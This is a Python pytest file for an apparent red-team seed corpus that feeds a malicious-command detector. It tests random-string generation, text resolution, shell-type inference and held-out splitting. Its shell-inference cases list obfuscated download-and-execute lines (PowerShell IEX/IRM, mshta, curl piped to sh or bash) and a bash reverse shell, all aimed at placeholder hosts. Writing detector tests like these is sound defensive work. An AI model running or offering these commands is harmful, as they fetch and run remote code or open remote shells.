import json

import pytest

from redteam import seeds as S
from redteam.models import Shell
from redteam.mutate import _kw


def test_rand_matches_rust_reference_vectors():
    # crates/corpus/src/lib.rs rand_matches_reference_vectors
    assert (
        S.rand_string(26, S.charset('hex'), 32)
        == '7523db184189a13398d2e2324a1e9d33'
    )
    assert S.rand_string(7, S.charset('alnum'), 20) == 'vjmF2UIqqVeAnNKiLXUT'
    whole = S.rand_string(26, S.charset('hex'), 32)
    assert S.rand_string(26, S.charset('hex'), 12, skip=20) == whole[20:]


def test_resolve_every_text_form():
    v = {
        'parts': [
            'a',
            {'repeat': {'text': {'parts': ['b', 'c']}, 'count': 2}},
            {'rand': {'seed': 26, 'charset': 'hex', 'len': 4}},
        ]
    }
    assert S.resolve_text(v) == 'abcbc7523'
    assert S.resolve_text('x​y') == 'x​y'
    with pytest.raises(S.TextError):
        S.resolve_text({'nope': 1})
    with pytest.raises(S.TextError):
        S.resolve_text({'repeat': {'text': 'ab', 'count': S.MAX_TEXT_CHARS}})


@pytest.mark.parametrize(
    ('payload', 'shell'),
    [
        (f'{_kw.PS} -w hidden -c "{_kw.IEX} x"', Shell.POWERSHELL),
        (f'{_kw.PWSH} -c "Get-Date" # lure', Shell.POWERSHELL),
        (f'{_kw.IRM} https://example.invalid/a | {_kw.IEX}', Shell.POWERSHELL),
        ('$c = 1; Write-Output $c', Shell.POWERSHELL),
        ("& ('a'+'b') x", Shell.POWERSHELL),
        ('p`ow`er' + '`sh`ell -c calc', Shell.POWERSHELL),
        ('ｐｏｗｅｒ' + 'ｓｈｅｌｌ -c calc', Shell.POWERSHELL),
        ('ms' + 'hta https://example.invalid/a', Shell.CMD),
        ('m^s^h^t^a x', Shell.CMD),
        ('"m"s"h"ta x', Shell.CMD),
        ('set x=ab&& call %x% y', Shell.CMD),
        ('%ComSpec:~-7,3% /c calc', Shell.CMD),
        ('curl -s https://example.invalid/a | cmd', Shell.CMD),
        (f'curl.exe -s https://example.invalid/a | {_kw.PWSH} -', Shell.CMD),
        ('\\\\example.invalid@SSL\\a.lnk', Shell.CMD),
        ('curl -fsSL https://example.invalid/a | sh', Shell.SH),
        ('curl -fsSL https://example.invalid/a | ba' + 'sh', Shell.BASH),
        ('ba' + 'sh -i >& /dev/tcp/192.0.2.1/1 0>&1', Shell.BASH),
        ('source <(curl -s https://example.invalid/a)', Shell.BASH),
        ('curl https://example.invalid/a | z' + 'sh', Shell.ZSH),
        ("osascript -e 'display dialog \"x\"'", Shell.SH),
        ('tell application "Terminal" to quit', Shell.APPLESCRIPT),
        ('```sh\ncurl -fsSL https://example.invalid/a | sh\n```', Shell.SH),
    ],
)
def test_infer_shell(payload, shell):
    assert S.infer_shell(payload) == shell


def test_split_is_stable_and_near_ratio():
    assert S.split_for('command.bypass.base-001') == S.split_for(
        'command.bypass.base-001'
    )
    ids = [f'command.x.{i:04d}' for i in range(5000)]
    share = sum(S.split_for(i) == 'heldout' for i in ids) / len(ids)
    assert abs(share - S.HELDOUT_RATIO) < 0.02


def test_load_seeds_from_fixture(tmp_path):
    cases = tmp_path / 'cases'
    cases.mkdir()
    rows = [
        {
            'id': 'command.t.1',
            'area': 'command',
            'op': 'command.analyze',
            'source': 'new',
            'input': {'parts': ['ms', 'hta https://example.invalid/a']},
            'expect': {'level': 'malicious'},
        },
        {
            'id': 'command.t.2',
            'area': 'command',
            'op': 'command.analyze',
            'source': 'new',
            'input': 'echo hi',
            'expect': {'level': 'none'},
        },
        {
            'id': 'command.t.3',
            'area': 'command',
            'op': 'command.analyze',
            'source': 'new',
            'input': {'bad': 1},
            'expect': {'level': 'malicious'},
        },
        {
            'id': 'secret.t.1',
            'area': 'secret',
            'op': 'secret.detect',
            'source': 'new',
            'input': 'x',
            'expect': {'level': 'malicious'},
        },
    ]
    (cases / 'a.jsonl').write_text(
        '\n'.join(json.dumps(r) for r in rows) + '\n', encoding='utf-8'
    )
    stats = S.SeedStats()
    seeds = S.load_seeds(tmp_path, stats)
    assert [s.case_id for s in seeds] == ['command.t.1']
    assert seeds[0].shell == Shell.CMD
    assert stats.skipped == {'unresolvable_text': 1}
    assert 'hta' not in seeds[0].model_dump_json()


def test_real_corpus_seeds():
    stats = S.SeedStats()
    seeds = S.load_seeds(stats=stats)
    assert len(seeds) >= 229
    assert not stats.skipped
    assert sum(stats.per_split.values()) == len(seeds)
    assert stats.per_split['heldout'] == len(S.heldout(seeds))
    assert set(stats.per_shell) <= {s.value for s in Shell}
